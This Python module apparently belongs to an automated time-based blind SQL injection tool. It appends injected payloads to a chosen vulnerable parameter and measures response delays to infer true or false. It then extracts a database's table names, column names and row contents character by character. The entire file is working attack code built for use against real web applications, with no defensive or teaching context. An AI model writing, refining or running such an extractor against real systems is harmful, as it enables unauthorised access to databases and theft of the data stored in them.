#!/usr/bin/python3

import sys
import time
import string

from colorama import Fore
from urlQuery import sendReq

# Extract Binary Search algorithm (BiSection)
def boolenTF(url, params, d):
    start = time.time()
    r = sendReq(url, data=params, allow_redirects=False) if d else sendReq(url, params=params, allow_redirects=False)
    end = time.time()
    t = end - start
    if r.status_code == 200 and r.status_code != 500:
        if t >= 2:
            return True
        else:
            return False
     
def prepPayload(params, vulnPoint, payloads, row, extract, pos, x, tblName=None, clmName=None):
    if extract == "tbls":
        injPayload = payloads.format(row=row, pos=pos, x=x)
    elif extract == "clms":
        injPayload = payloads.format(tblName=tblName, row=row, pos=pos, x=x)
    elif extract == "info":
        injPayload = payloads.format(clmName=clmName, tblName=tblName, row=row, pos=pos, x=x)
    newParams = params.copy()
    newParams[vulnPoint] += injPayload
    return newParams

def extractTimeInfo(url, params, vulnPoint, payloads, row, d, extract, tblName=None, clmName=None, max_length=100):
    x = ''
    pos = 1
    while True:
        found = False
        for char in string.ascii_lowercase + string.ascii_uppercase + string.digits + "!\"£$%^&*()_+=-][\{\}/.,<>?]":
            newParams = prepPayload(params, vulnPoint, payloads, row, extract, pos, ord(char), tblName=tblName, clmName=clmName)
            if boolenTF(url, newParams, d):
                x += char
                sys.stdout.write(Fore.GREEN + f"\r[+] Result: {x}" + Fore.RESET)
                pos += 1
                found = True
                break
        
        if not found or len(x) >= max_length:
            break
    return x

def extractTables(url, params, vulnPoint, payloads, d):
    row = 0
    tblNames = []
    while True:
        tempTbl = extractTimeInfo(url, params, vulnPoint, payloads, row, d, extract='tbls')
        if tempTbl:
            print ()
            tblNames.append(tempTbl)
            row += 1
        else:
            break
    return tblNames

def extractColumns(url, params, vulnPoint, payloads, d, tblNames):
    clmNames = {}
    for tblName in tblNames:
        clmNames[tblName] = []
        row = 0
        while True:
            tempClm = extractTimeInfo(url, params, vulnPoint, payloads, row, d, extract='clms', tblName=tblName)
            if tempClm:
                print ()
                clmNames[tblName].append(tempClm)
                row += 1
            else:
                break
    return clmNames
    
def extractInfo(url, params, vulnPoint, payloads, d, tblNames, clmNames):
    info = {}
    for tblName in tblNames:
        row = 0
        info[tblName] = []
        while True:
            tempDict = {}
            for clmName in clmNames[tblName]:
                print ()
                tempInfo = extractTimeInfo(url, params, vulnPoint, payloads, row, d, extract='info', tblName=tblName, clmName=clmName)
                tempDict[clmName] = tempInfo
            if not any(tempDict.values()):
                break
            info[tblName].append(tempDict)
            row += 1
    return info              

def extractTimeMain(url, params, vulnPoint, payloads, d, tbl=None, clm=None):
    info = {}
    tblNames = [tbl] if tbl is not None else extractTables(url, params, vulnPoint, payloads[0], d)
    clmNames = {tbl: clm} if clm is not None else extractColumns(url, params, vulnPoint, payloads[1], d, tblNames)
    info.update(extractInfo(url, params, vulnPoint, payloads[2], d, tblNames, clmNames))
    
    if tbl is None and clm is None and info:
        return True, info
    elif tblNames and clmNames and info and any(info.values()):
        return True, info
    else:
        return False, info